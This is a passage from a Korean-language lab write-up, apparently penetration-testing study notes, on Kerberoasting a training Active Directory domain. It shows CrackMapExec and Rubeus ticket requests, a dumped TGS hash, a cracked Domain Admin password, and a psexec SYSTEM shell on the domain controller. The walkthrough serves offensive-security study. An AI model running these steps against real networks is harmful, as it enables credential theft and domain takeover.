bb37152df6bab2f5e5bcb84c999b62fe2961509e04dd386f20c286a41f23d6df3b8e21262ce68691c3443206049035e9703970f8e8ef0b42d1cce1a860dd34adec8b7b611f656b71e90c914a317af0838a4dc9ee639f8fe8a94967e66d6ee39261aefd44dab9506b12f2606bbb636841d1615880b8bfaf69cc6dfc30cd56a0c124083be1a3fd8f1d4e8a0ed4298a28d27bb4be7c87fa663d4f5ce15133d7321062499aeee29d609258320ef2d7826806d6ffef45e2519d3e29ab2863bf5c5b66ad220d0681c41162f99e91047837e351b4a43f1d8c682e80ae51a133056eb63269df7109512e30c56356ec02d8c06ea5669841bdc476419079c3ab310a10b2678761dc9d2c74c65361e50790db0dbba32deba93b9f0860dca3318573536d467c2f5b88f65f3ca401732fc9508ebccb978fb84ddd70f42e68c543e63af102bbcd12e12fd7d71d945e452e0fcb927874ac04367a55ae896040a377254e3223ae99af16be118c09fde4c793b97d746ef81a022216440ad993a5c532dabe1dbc2f7f5fe1839ef758a0455fb8370bf6311fcfe9b4a0defa41a9442adf2f0e61ed2bc195a8175475cadad4fedf64d3af2ab3156a042dccb3e3dc01e9ad9e0952a92b2136e369da62feadbccc89eae2857725747289b309636673c8942a00d53bd52bd70d677cf221f64b3fa9491519a82cdb99aa1d4d28fd1c7888256d62cbd2560b3ef6886132e9117ccd5ea3dc562b5a73a9afed88486d8a7efcfa7632836489b4077661c31e1a7c69892c183ef0116033f7ee033502d8a28656b6911f789a389e77e97c6d3df6f7bd52
```

출력된 `$krb5tgs$...` 값은 암호화 방식에 맞는 Hashcat/John 모드로 오프라인 크랙을 시도할 수 있다.

또한 CrackMapExec의 Kerberoasting 기능을 이용하면 SPN 계정을 빠르게 열거하고 서비스 티켓을 요청할 수도 있다:

```bash
$ crackmapexec ldap 172.16.5.5 -u wley -p 'transporter@4' --kerberoasting spnuser

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  sAMAccountName: damundsen memberOf: CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL pwdLastSet: 2022-03-24 12:20:34.127432 lastLogon:2026-07-22 04:47:14.606617 
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  $krb5tgs$23$*damundsen$INLANEFREIGHT.LOCAL$MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL~1433*$c80a7de11740dbf1c4b56dc35d84037b$07eef5a5efadc1e67c89aba437ce3bc35e9c1e0909b9e2df23d58bea017aa21f8bfb5eaf32dd5d6e4467e8be0e640e38e18902405b804b6874f940b9ff9a93be79e73f6b634bb9cf6111dd20dd0268658181f4bb8e204f12050fec453bb147bd1127b645dcfcdde4f54e5f807b8dc395ac7f60c14
```

### Cracking and Privilege Validation

여러 서비스 계정을 대상으로 오프라인 크랙을 진행하던 중 `sqldev` 계정의 비밀번호를 복구할 수 있었다.

확보한 자격 증명은 다음과 같다:

```text
sqldev:database!
```

앞서 Domain Admins 구성원을 열거했을 때 `sqldev` 가 해당 그룹에 포함되어 있었으므로, 이 자격 증명은 일반 서비스 계정보다 훨씬 높은 가치가 있다.

먼저 WinRM 인증을 확인하였다:

```bash
$ crackmapexec winrm 172.16.5.5 -u sqldev -p 'database!'     

WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] http://172.16.5.5:5985/wsman
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

실제로 원격 명령 실행이 가능한지 `psexec.py` 로 확인하였다:

```bash
$ psexec.py 'INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5'

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

이처럼 DC01에서 `NT AUTHORITY\SYSTEM` 권한의 셸을 획득하였다.

또한 `sqldev` 자체가 Domain Admins 구성원이므로 이 시점에서는 사실상 도메인 전체가 침해된 것으로 볼 수 있다.

## Kerberoasting - Windows

### PowerView and SetSPN

Windows에서도 동일한 원리로 SPN 보유 사용자 계정을 열거하고 서비스 티켓을 요청할 수 있다.

먼저 PowerView를 이용해 SPN이 설정된 사용자 계정을 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad12.png)

이후 `Get-DomainSPNTicket` 등을 이용하여 대상 사용자에 대한 서비스 티켓을 요청하고 크랙 가능한 형식으로 출력할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad13.png)

SPN 자체를 확인하는 용도로는 Windows 기본 도구인 `setspn.exe` 도 사용할 수 있다.

### Rubeus Kerberoasting

Kerberoasting에는 `Rubeus.exe` 도 널리 사용된다.

Rubeus kerberoast는 대상 SPN의 TGS를 요청한 뒤 오프라인 크랙에 사용할 수 있는 `$krb5tgs$...` 형식으로 출력해준다.

여기서는 `sqldev` 계정만 지정하여 Kerberoasting을 수행한다.

다음과 같이 실행할 수 있다:

```powershell
PS C:\tools> .\Rubeus.exe kerberoast /user:sqldev /nowrap
```

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad14.png)